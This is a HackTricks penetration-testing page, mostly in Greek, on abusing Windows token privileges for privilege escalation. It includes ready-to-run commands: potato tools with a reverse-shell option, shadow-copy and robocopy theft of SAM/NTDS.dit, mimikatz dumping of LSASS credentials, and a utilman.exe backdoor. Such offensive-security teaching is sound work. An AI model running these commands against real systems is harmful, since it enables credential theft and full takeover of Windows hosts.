# Κατάχρηση Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Αν **δεν ξέρετε τι είναι τα Windows Access Tokens** διαβάστε αυτή τη σελίδα πριν συνεχίσετε:


{{#ref}}
access-tokens.md
{{#endref}}

**Ίσως να μπορείτε να κάνετε privilege escalation καταχρώμενοι τα tokens που ήδη έχετε**

### SeImpersonatePrivilege

Αυτό είναι ένα privilege που κατέχεται από οποιαδήποτε process και επιτρέπει την impersonation (αλλά όχι τη δημιουργία) οποιουδήποτε token, εφόσον μπορεί να αποκτηθεί ένα handle σε αυτό. Ένα privileged token μπορεί να αποκτηθεί από μια Windows service (DCOM) προκαλώντας τη να εκτελέσει NTLM authentication εναντίον ενός exploit, ενεργοποιώντας στη συνέχεια την εκτέλεση μιας process με SYSTEM privileges. Αυτή η vulnerability μπορεί να εκμεταλλευτεί με διάφορα tools, όπως [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (το οποίο απαιτεί το winrm να είναι disabled), [SweetPotato](https://github.com/CCob/SweetPotato), και [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: σε Windows 10 1809+/Server 2019+, προτιμήστε **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, ή **PrintSpoofer** ανάλογα με το ποια επιφάνεια RPC/COM είναι ακόμα προσβάσιμη.
- Αν έχετε compromized μια service που τρέχει ως **`LOCAL SERVICE`** ή **`NETWORK SERVICE`** και το `whoami /priv` δείχνει ένα **filtered token** χωρίς `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, ανακτήστε πρώτα το **default privilege set** του λογαριασμού (για παράδειγμα με **FullPowers**) και μετά δοκιμάστε ξανά την οικογένεια potato.
- Μερικά νεότερα forks είναι πιο operator-friendly από τα αρχικά tools. Για παράδειγμα, το **SigmaPotato** προσθέτει reflection/in-memory execution και σύγχρονη Windows compatibility, ενώ το **PrintNotifyPotato** καταχράται το PrintNotify COM service και είναι συχνά χρήσιμο όταν το κλασικό Spooler path είναι disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Είναι πολύ παρόμοιο με το **SeImpersonatePrivilege**, θα χρησιμοποιήσει την **ίδια μέθοδο** για να αποκτήσει ένα privileged token.\
Στη συνέχεια, αυτό το privilege επιτρέπει να **αναθέσεις ένα primary token** σε ένα νέο/suspended process. Με το privileged impersonation token μπορείς να παραγάγεις ένα primary token (DuplicateTokenEx).\
Με το token, μπορείς να δημιουργήσεις ένα **νέο process** με 'CreateProcessAsUser' ή να δημιουργήσεις ένα process suspended και να **ορίσεις το token** (γενικά, δεν μπορείς να τροποποιήσεις το primary token ενός running process).

### SeTcbPrivilege

Αν έχεις ενεργοποιήσει αυτό το token, μπορείς να χρησιμοποιήσεις το **KERB_S4U_LOGON** για να αποκτήσεις ένα **impersonation token** για οποιονδήποτε άλλο user χωρίς να γνωρίζεις τα credentials, να **προσθέσεις ένα αυθαίρετο group** (admins) στο token, να ορίσεις το **integrity level** του token σε "**medium**", και να αναθέσεις αυτό το token στο **current thread** (SetThreadToken).

### SeBackupPrivilege

Το system αναγκάζεται να **παρέχει πλήρη read access** σε οποιοδήποτε file (περιορισμένο σε read operations) από αυτό το privilege. Χρησιμοποιείται για το **reading των password hashes των τοπικών Administrator** accounts από το registry, μετά το οποίο, tools όπως "**psexec**" ή "**wmiexec**" μπορούν να χρησιμοποιηθούν με το hash (Pass-the-Hash technique). Ωστόσο, αυτή η technique αποτυγχάνει υπό δύο συνθήκες: όταν το Local Administrator account είναι disabled, ή όταν υπάρχει policy που αφαιρεί administrative rights από Local Administrators που συνδέονται remotely.\
Στην πράξη, το πιο αξιόπιστο built-in workflow είναι συνήθως **VSS + `robocopy /b`**: δημιούργησε/εμφάνισε ένα shadow copy, και μετά αντέγραψε `SAM`/`SYSTEM` ή `NTDS.dit` σε **backup mode**, το οποίο παρακάμπτει τα file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Η άδεια για **write access** σε οποιοδήποτε system file, ανεξάρτητα από το Access Control List (ACL) του αρχείου, παρέχεται από αυτό το privilege. Ανοίγει πολλές δυνατότητες για escalation, συμπεριλαμβανομένης της δυνατότητας να **modify services**, να κάνεις DLL Hijacking, και να ορίσεις **debuggers** μέσω των Image File Execution Options, μαζί με διάφορες άλλες techniques.

### SeCreateTokenPrivilege

Το SeCreateTokenPrivilege είναι ένα ισχυρό permission, ιδιαίτερα χρήσιμο όταν ένας user διαθέτει τη δυνατότητα να impersonate tokens, αλλά και όταν δεν υπάρχει SeImpersonatePrivilege. Αυτή η δυνατότητα βασίζεται στη δυνατότητα να impersonate ένα token που αντιπροσωπεύει τον ίδιο user και του οποίου το integrity level δεν υπερβαίνει αυτό του current process.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Είναι δυνατό να αξιοποιηθεί το SeCreateTokenPrivilege για EoP μέσω impersonation tokens υπό συγκεκριμένες συνθήκες.
- **Conditions for Token Impersonation:** Η επιτυχής impersonation απαιτεί το target token να ανήκει στον ίδιο user και να έχει integrity level μικρότερο ή ίσο από το integrity level του process που επιχειρεί την impersonation.
- **Creation and Modification of Impersonation Tokens:** Οι users μπορούν να create ένα impersonation token και να το ενισχύσουν προσθέτοντας το SID (Security Identifier) ενός privileged group.

### SeLoadDriverPrivilege

Αυτό το privilege επιτρέπει να **load and unload device drivers** με τη δημιουργία ενός registry entry με συγκεκριμένες τιμές για `ImagePath` και `Type`. Επειδή το direct write access στο `HKLM` (HKEY_LOCAL_MACHINE) είναι restricted, πρέπει να χρησιμοποιηθεί το `HKCU` (HKEY_CURRENT_USER) αντί αυτού. Ωστόσο, για να γίνει το `HKCU` αναγνωρίσιμο από το kernel για driver configuration, πρέπει να ακολουθηθεί ένα συγκεκριμένο path.

Το Modern offensive use είναι συνήθως **BYOVD** (bring your own vulnerable driver): load ένα **signed but vulnerable** kernel driver και μετά χρησιμοποίησε τα IOCTLs του για να απενεργοποιήσεις protections ή να περάσεις σε kernel code execution. Να θυμάσαι ότι σε πρόσφατα Windows 11/Server builds το **Microsoft vulnerable driver blocklist** και/ή το **HVCI/Memory Integrity** συχνά χαλούν παλιότερες public chains, οπότε τα κλασικά παραδείγματα τύπου `szkg64.sys` δεν είναι πλέον universally reliable.

This path is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, where `<RID>` is the Relative Identifier of the current user. Inside `HKCU`, this entire path must be created, and two values need to be set:

- `ImagePath`, which is the path to the binary to be executed
- `Type`, with a value of `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Access `HKCU` instead of `HKLM` due to restricted write access.
2. Create the path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` within `HKCU`, where `<RID>` represents the current user's Relative Identifier.
3. Set the `ImagePath` to the binary's execution path.
4. Assign the `Type` as `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Περισσότεροι τρόποι για να καταχραστείτε αυτό το privilege σε [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Αυτό είναι παρόμοιο με το **SeRestorePrivilege**. Η κύρια λειτουργία του επιτρέπει σε μια process να **αναλάβει την ownership ενός object**, παρακάμπτοντας την απαίτηση για explicit discretionary access μέσω της παροχής WRITE_OWNER access rights. Η διαδικασία περιλαμβάνει πρώτα την εξασφάλιση της ownership του επιθυμητού registry key για σκοπούς εγγραφής, και στη συνέχεια την τροποποίηση του DACL ώστε να επιτραπούν write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Αυτή η privilege επιτρέπει το **debug other processes**, συμπεριλαμβανομένου του να διαβάζεις και να γράφεις στη memory. Διάφορες στρατηγικές για memory injection, ικανές να παρακάμπτουν τα περισσότερα antivirus και host intrusion prevention solutions, μπορούν να χρησιμοποιηθούν με αυτήν την privilege.

Στα σύγχρονα Windows, να θυμάσαι ότι το `SeDebugPrivilege` συνήθως αρκεί για να ανοίξεις **non-protected SYSTEM processes** και να κάνεις duplicate τα tokens τους, αλλά **δεν** εγγυάται ότι μπορείς να αγγίξεις το **LSASS**. Αν το **RunAsPPL / LSA Protection** είναι ενεργό, τα non-protected processes δεν μπορούν να διαβάσουν ή να κάνουν inject στο LSASS ακόμα κι αν υπάρχει το `SeDebugPrivilege`. Σε αυτή την περίπτωση, κλέψε ένα token από κάποιο άλλο non-PPL SYSTEM process, ή κάνε chain με ένα PPL bypass/BYOVD αντί να υποθέτεις ότι το `procdump` θα δουλέψει. Για ένα πλήρες token-copy example με χρήση `SeDebugPrivilege` + `SeImpersonatePrivilege`, δες [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Μπορείς να χρησιμοποιήσεις το [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) από το [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) για να **capture the memory of a process**. Συγκεκριμένα, αυτό μπορεί να εφαρμοστεί στη διαδικασία **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, η οποία είναι υπεύθυνη για την αποθήκευση των credentials του χρήστη αφού ο χρήστης έχει κάνει επιτυχημένα log in σε ένα system.

Στη συνέχεια μπορείς να φορτώσεις αυτό το dump στο mimikatz για να πάρεις passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Αν θέλεις να αποκτήσεις ένα `NT SYSTEM` shell, μπορείς να χρησιμοποιήσεις:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Αυτό το δικαίωμα (Perform volume maintenance tasks) επιτρέπει το άνοιγμα raw volume device handles (π.χ., \\.\C:) για direct disk I/O που παρακάμπτει τα NTFS ACLs. Με αυτό μπορείς να αντιγράψεις bytes οποιουδήποτε αρχείου στο volume διαβάζοντας τα υποκείμενα blocks, επιτρέποντας arbitrary file read ευαίσθητου υλικού (π.χ., machine private keys στο %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS). Είναι ιδιαίτερα σημαντικό σε CA servers, όπου η exfiltrating του CA private key επιτρέπει το forging ενός Golden Certificate για να impersonate οποιοδήποτε principal.

Δες detailed techniques and mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Τα **tokens που εμφανίζονται ως Disabled** συνήθως μπορούν να ενεργοποιηθούν, οπότε συχνά μπορείς να abuse και τα _Enabled_ και τα _Disabled_ privileges.

### Enable All the tokens

Αν έχεις disabled privileges, μπορείς να χρησιμοποιήσεις το script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) για να ενεργοποιήσεις όλα τα tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ή το **script** που είναι ενσωματωμένο σε αυτό το [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Πίνακας

Πλήρες token privileges cheatsheet στο [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), η παρακάτω σύνοψη θα περιλαμβάνει μόνο άμεσους τρόπους εκμετάλλευσης του privilege για να αποκτήσεις admin session ή να διαβάσεις ευαίσθητα αρχεία.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Ευχαριστώ τον [Aurélien Chalot](https://twitter.com/Defte_) για την ενημέρωση. Θα προσπαθήσω να το ξαναδιατυπώσω σε πιο recipe-like μορφή σύντομα.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Ανάγνωση ευαίσθητων αρχείων με `robocopy /b` ή dedicated SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- Πολύ χρήσιμο για `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, και μερικές φορές `%WINDIR%\MEMORY.DMP`.<br><br>- Το `robocopy` είναι βολικό, αλλά τα dedicated SeBackup cmdlets/APIs είναι συχνά πιο ευέλικτα για locked/open αρχεία.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Δημιουργία arbitrary token, συμπεριλαμβανομένων local admin rights, με `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Διπλασιασμός ενός **non-PPL** SYSTEM token ή dump memory από non-protected process.                                                                                                                                                                                                                                                                 | <p>Το LSASS dumping συνήθως μπλοκάρεται αν είναι ενεργοποιημένο το RunAsPPL/LSA Protection.</p><p>Το script βρίσκεται στο [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Χρήση της **Potato family** / named-pipe impersonation για εκκίνηση SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, κ.λπ.).                                                                                                                                                                                    | <p>Πιο πρακτικό από service accounts όπως IIS APPPOOL, MSSQL, scheduled tasks, ή οποιοδήποτε context που ήδη έχει `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Φόρτωσε έναν signed-but-vulnerable kernel driver (BYOVD)<br>2. Χρησιμοποίησε τα IOCTLs του driver για kernel R/W, disable security tooling, ή elevation σε SYSTEM<br><br>Εναλλακτικά, το privilege μπορεί να χρησιμοποιηθεί για να unload security-related drivers με την built-in command <code>fltMC</code>, π.χ. <code>fltMC sysmondrv</code></p>                     | <p>Παλιότεροι public drivers όπως ο <code>szkg64.sys</code> μπλοκάρονται ολοένα και περισσότερο σε σύγχρονα Windows από το vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Άνοιξε PowerShell/ISE με το privilege SeRestore παρόν.<br>2. Ενεργοποίησε το privilege με <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Μετονόμασε το utilman.exe σε utilman.old<br>4. Μετονόμασε το cmd.exe σε utilman.exe<br>5. Κλείδωσε την κονσόλα και πάτησε Win+U</p> | <p>Η επίθεση μπορεί να ανιχνευθεί από κάποιο AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που είναι αποθηκευμένα στο "Program Files" χρησιμοποιώντας το ίδιο privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Μετονόμασε το cmd.exe σε utilman.exe<br>4. Κλείδωσε την κονσόλα και πάτησε Win+U</p>                                                                                                                                       | <p>Η επίθεση μπορεί να ανιχνευθεί από κάποιο AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που είναι αποθηκευμένα στο "Program Files" χρησιμοποιώντας το ίδιο privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Χειρισμός tokens ώστε να περιλαμβάνονται local admin rights. Μπορεί να απαιτεί SeImpersonate.</p><p>Προς επιβεβαίωση.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## Αναφορές

- Ρίξε μια ματιά σε αυτόν τον πίνακα που ορίζει Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Ρίξε μια ματιά σε [**αυτό το paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) για privesc με tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
